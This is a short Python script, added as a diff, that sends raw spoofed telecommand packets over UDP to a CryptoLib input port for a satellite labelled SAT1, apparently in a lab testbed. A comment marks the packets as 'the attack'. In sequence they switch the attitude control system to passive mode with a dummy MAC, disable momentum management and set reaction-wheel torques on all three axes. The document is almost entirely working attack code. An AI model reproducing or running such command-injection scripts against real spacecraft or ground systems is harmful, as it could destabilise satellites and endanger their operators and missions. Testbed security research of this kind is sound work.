@@ -1,0 +1,47 @@
+import socket
+import numpy as np
+import time
+
+
+def send_to_socket(IP, PORT, command):
+
+	byte_message = bytes(command)
+
+	opened_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+
+	opened_socket.sendto(byte_message, (IP, PORT))	
+	
+	return
+
+
+######
+
+IP = "192.168.100.5"
+
+PORT = 6010 #6010 input port of CryptoLib for SAT1
+
+# SPP labeled on the 8th octet (from 0x00 to 0x16=10+12) to sign the attack!
+
+# ADCS 'PASSIVE MODE'
+command1 = [0x19,0x40,0xC0,0x00,0x00,0x06,0x02,0x16,0x00, 0x30,0x30,0x30,0x30] # with MAC 0000
+
+# ADCS 'MOMENTUM MANAGEMENT OFF'
+command2 = [0x19,0x40,0xC0,0x00,0x00,0x02,0x08,0x16,0x00] 
+
+# RW 'SET TORQUE' X, Y, Z
+command3 = [0x19,0x92,0xC0,0x00,0x00,0x04,0x03,0x16,0x00,0x0A,0x00] 
+
+command4 = [0x19,0x92,0xC0,0x00,0x00,0x04,0x03,0x16,0x01,0x0A,0x00] 
+
+command5 = [0x19,0x92,0xC0,0x00,0x00,0x04,0x03,0x16,0x02,0x0A,0x00] 
+
+
+send_to_socket(IP, PORT, command1)
+time.sleep(1)
+send_to_socket(IP, PORT, command2)
+time.sleep(1)
+send_to_socket(IP, PORT, command3)
+time.sleep(1)
+send_to_socket(IP, PORT, command4)
+time.sleep(1)
+send_to_socket(IP, PORT, command5)
